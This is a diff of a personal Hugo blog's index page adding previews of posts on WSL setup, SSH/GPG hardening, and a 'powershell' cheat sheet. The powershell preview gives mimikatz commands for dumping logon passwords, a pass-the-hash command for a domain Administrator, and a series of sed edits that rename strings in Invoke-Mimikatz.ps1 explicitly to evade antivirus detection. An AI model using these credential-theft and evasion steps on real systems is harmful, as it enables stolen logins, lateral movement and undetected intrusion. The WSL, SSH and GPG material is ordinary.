@@ -54,7 +54,7 @@
               <a class="navlinks-parent" href="javascript:void(0)">dispatch</a>
               <div class="navlinks-children">
                 
-                  <a href="/post/001">#001</a>
+                  <a href="/post/wsl">wsl</a>
                 
                   <a href="/post/002">#002</a>
                 
@@ -72,6 +72,8 @@
                   <a href="/intel/101">101</a>
                 
                   <a href="/intel/tools">tools</a>
+                
+                  <a href="/intel/powershell">powershell</a>
                 
                   <a href="/intel/cheats">cheatsheets</a>
                 
@@ -195,6 +197,60 @@
         <div class="posts-list">
           
             <article class="post-preview">
+              <a href="https://blackvolga.github.io/post/wsl/">
+                <h2 class="post-title">wsl</h2>
+
+                
+                  <h3 class="post-subtitle">
+                    Without torture, no science
+                  </h3>
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 6, 2018
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 2 minutes (361 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  Sometimes we all get stuck on a windows machine. Luckily Windows subsystem for Linux has matured into a surprising alternative to cygwin or VMs for your basic terminal needs.
+First Thing&rsquo;s First
+Windows 10 is a clusterfuck of bloatware, ads and tracking. Remove as much as you can before you begin (why haven&rsquo;t you done this already?)
+https://github.com/adolfintel/Windows10-Privacy
+Debian WSL Install
+ Install WSL - Open PowerShell as Administrator (restart required) Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux Install Debian Invoke-WebRequest -Uri https://aka.
+                  <a href="https://blackvolga.github.io/post/wsl/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://blackvolga.github.io/tags/intel/">intel</a>&nbsp;
+                  
+                    <a href="https://blackvolga.github.io/tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://blackvolga.github.io/tags/wsl/">wsl</a>&nbsp;
+                  
+                    <a href="https://blackvolga.github.io/tags/debian/">debian</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
               <a href="https://blackvolga.github.io/intel/101/">
                 <h2 class="post-title">101</h2>
 
@@ -213,7 +269,7 @@
   
   
   &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 1 minutes (23 words)
+  <i class="fa fa-clock-o"></i> 3 minutes (502 words)
   
   
 </span>
@@ -222,22 +278,21 @@
               </p>
               <div class="post-entry">
                 
-                  <p><a href="https://antergos.com/try-it/">Antergos</a> OR <a href="https://tails.boum.org/install/index.en.html">TAILS</a></p>
-
-<p>Bonus! <a href="https://github.com/lfit/ssh-gpg-smartcard-config/blob/master/YubiKey_NEO.rst">https://github.com/lfit/ssh-gpg-smartcard-config/blob/master/YubiKey_NEO.rst</a></p>
-
-<p>Start with the basics: <a href="https://ssd.eff.org/en">https://ssd.eff.org/en</a></p>
-
-<p>Arch First Steps:</p>
-
-<p><a href="https://github.com/Jguer/yay">https://github.com/Jguer/yay</a></p>
-
-<p><a href="https://github.com/sorin-ionescu/prezto">https://github.com/sorin-ionescu/prezto</a></p>
-
-<p><a href="https://wiki.archlinux.org/index.php/security">https://wiki.archlinux.org/index.php/security</a></p>
-
-<p>For everything else, see the oracle: <a href="https://wiki.archlinux.org/index.php">wiki.archlinux.org</a></p>
-
+                  #OS Antergos OR TAILS
+Start with the basics: https://ssd.eff.org/en Advanced Mode: https://www.qubes-os.org/
+##Arch First Steps
+https://github.com/Jguer/yay
+https://github.com/sorin-ionescu/prezto
+https://wiki.archlinux.org/index.php/security
+For everything else, see the oracle: wiki.archlinux.org
+##SSH
+EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
+ssh-keygen -t ed25519 -a 100 OR ssh-keygen -t rsa -b 4096 -o -a 100
+Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
+##GPG
+~/.gnupg/gpg.conf:
+# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 ###Create Master Key gpg2 --expert --full-gen-key OPTION 8 &gt; s &gt; e &gt; q 4096 &gt; 1y &gt; y
+                  <a href="https://blackvolga.github.io/intel/101/" class="post-read-more">[Read More]</a>
                 
               </div>
 
@@ -245,6 +300,59 @@
                 <div class="blog-tags">
                   
                     <a href="https://blackvolga.github.io/tags/intel/">intel</a>&nbsp;
+                  
+                </div>
+              
+
+            </article>
+          
+            <article class="post-preview">
+              <a href="https://blackvolga.github.io/intel/powershell/">
+                <h2 class="post-title">powershell</h2>
+
+                
+                  <h3 class="post-subtitle">
+                    Why skate a half pipe, when you can skate a sewer pipe
+                  </h3>
+                
+              </a>
+
+              <p class="post-meta">
+                <span class="post-meta">
+  
+  
+  <i class="fa fa-calendar-o"></i>&nbsp;Posted on October 3, 2017
+  
+  
+  &nbsp;|&nbsp;
+  <i class="fa fa-clock-o"></i> 1 minutes (117 words)
+  
+  
+</span>
+
+
+              </p>
+              <div class="post-entry">
+                
+                  https://github.com/gentilkiwi/mimikatz
+https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
+TLDR: 1.\mimikatz &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords&#34; exit
+extract passwds
+1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
+1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
+1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&#39; Invoke-MimiDawgz.ps1 4sed -i -e &#39;/&lt;#/,/#&gt;/c\\&#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &#39;s/^[[:space:]]*#.*$//g&#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &#39;s/DumpCreds/DumpCred/g&#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &#39;s/ArgumentPtr/NotTodayPal/g&#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&#39; 13Invoke-MimiDawgz.
+                  <a href="https://blackvolga.github.io/intel/powershell/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://blackvolga.github.io/tags/intel/">intel</a>&nbsp;
+                  
+                    <a href="https://blackvolga.github.io/tags/windows/">windows</a>&nbsp;
+                  
+                    <a href="https://blackvolga.github.io/tags/powershell/">powershell</a>&nbsp;
                   
                 </div>
               
@@ -264,14 +372,6 @@
         <ul class="list-inline text-center footer-links">
           
               <li>
-                <a href="mailto:blackvolga@pm.me" title="Email me">
-                  <span class="fa-stack fa-lg">
-                    <i class="fa fa-circle fa-stack-2x"></i>
-                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
-                  </span>
-                </a>
-              </li>
-              <li>
                 <a href="https://github.com/blackvolga" title="GitHub">
                   <span class="fa-stack fa-lg">
                     <i class="fa fa-circle fa-stack-2x"></i>
@@ -279,7 +379,22 @@
                   </span>
                 </a>
               </li>
-          
+              <li>
+                <a href="mailto:blackvolga@pm.me" title="Mail me">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
+              <li>
+                <a href="https://explorer.bitcoin.com/bch/address/bitcoincash:qqyc9j2nxuvjvt27487q4u4xclac2nmmvqasrqmhhm" title="Bitcoin Cash">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-bitcoin fa-stack-1x fa-inverse"></i>
+                  </span>
+                </a>
+              </li>
         </ul>
         <p class="credits theme-by text-muted">
            <a href="http://gohugo.io">Hugo v0.49</a>
